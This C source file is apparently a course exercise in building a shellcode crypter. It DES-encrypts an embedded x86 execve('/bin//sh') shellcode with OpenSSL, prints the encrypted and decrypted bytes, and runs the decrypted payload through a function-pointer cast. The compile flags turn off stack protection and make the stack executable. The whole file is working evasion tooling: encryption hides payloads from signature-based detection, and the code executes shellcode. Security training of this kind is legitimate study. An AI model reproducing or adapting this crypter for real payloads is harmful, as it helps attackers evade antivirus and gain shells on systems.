#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <openssl/des.h>

/*
 * Compile: gcc des.c -fno-stack-protector -z execstack -lssl -o des
 *
 * If necessary, apt-get install libssl-dev
 */
 
/*
 * With lots of help on Encrypt and Decrypt from
 * http://www.codealias.info/technotes/des_encryption_using_openssl_a_simple_example
 * and Network Security with OpenSSL (from O'Reilly)
 *
 * Because of the simplicity of using DES and how like my code it already was
 * I have copied the functions for Encrypt and Decrypt from codealias.
 *
 * I changed the name of the DES_cblock variable so that it made more sense to me
 * from my reading of Network Security.
 */
 
char *
Encrypt( char *Key, char *Msg, int size)
{
 
	static char*	retval;
	int		n=0;
	DES_cblock	dcb;
	DES_key_schedule schedule;
 
	retval = ( char * ) malloc( size );
 
	/* Prepare the key for use with DES_cfb64_encrypt */
	memcpy( dcb, Key,8);
	DES_set_odd_parity( &dcb );
	DES_set_key_checked( &dcb, &schedule );
 
	/* Encryption occurs here */
	DES_cfb64_encrypt( ( unsigned char * ) Msg, ( unsigned char * ) retval,
				size, &schedule, &dcb, &n, DES_ENCRYPT );
 
	 return (retval);
}
 
 
char *
Decrypt( char *Key, char *Msg, int size)
{
 
	static char*	retval;
	int		n=0;
 
	DES_cblock	dcb;
	DES_key_schedule schedule;
 
	retval = ( char * ) malloc( size );
 
	/* Prepare the key for use with DES_cfb64_encrypt */
	memcpy( dcb, Key,8);
	DES_set_odd_parity( &dcb );
	DES_set_key_checked( &dcb, &schedule );
 
	/* Decryption occurs here */
	DES_cfb64_encrypt( ( unsigned char * ) Msg, ( unsigned char * ) retval,
				size, &schedule, &dcb, &n, DES_DECRYPT );
 
	return (retval);
 
}

/* Help from http://stackoverflow.com/questions/7496657/when-printing-hex-values-using-x-why-is-ffffff-printed-after-each-value */
void hexdump( char* string, int size )
{
	int i = 0;

	for( i = 0; i < size; i++ )
	{
		printf("\\x%02x", (int)(*(unsigned char*)(&string[i])) );
	}
	printf("\n");
}

int main( int argc, char * argv[] ) {

	char key[16];
	key[0] = 0;

	if ( argc == 2 )
	{
		snprintf(key, 16, "%s", argv[1]);
	} else {
		printf("No password provided. Defaulting to slae-431\n");
		snprintf(key, 8, "%s", "slae-431");
	}

	char shellcode[] = \
	"\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68"
	"\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd"
	"\x80";

	char *decrypted;
	char *encrypted;
	int i;
 
	encrypted = malloc(sizeof(shellcode));
	decrypted = malloc(sizeof(shellcode));

	/*
	 * Encrypt the shellcode string and copy it into our encrypted
	 * buffer, then print it out for reference
	 */ 
	memcpy(encrypted,Encrypt(key,shellcode,sizeof(shellcode)), sizeof(shellcode));

	printf("Encrypted: ");
	hexdump( encrypted, sizeof( shellcode ) );

	/*
	 * Decrypt the "encrypted" string and copy it into our decrypted
	 * buffer, then print it out. The code should match our shellcode
	 * string.
	 */
	memcpy(decrypted,Decrypt(key,encrypted,sizeof(shellcode)), sizeof(shellcode));

	printf("Decrypted: ");
	hexdump( decrypted, sizeof( shellcode ) );

	/*
	 * Shellcode exec
	 */
	int (*func)();
	func = (int (*)()) decrypted;
	(int)(*func)();

	return (0);
}
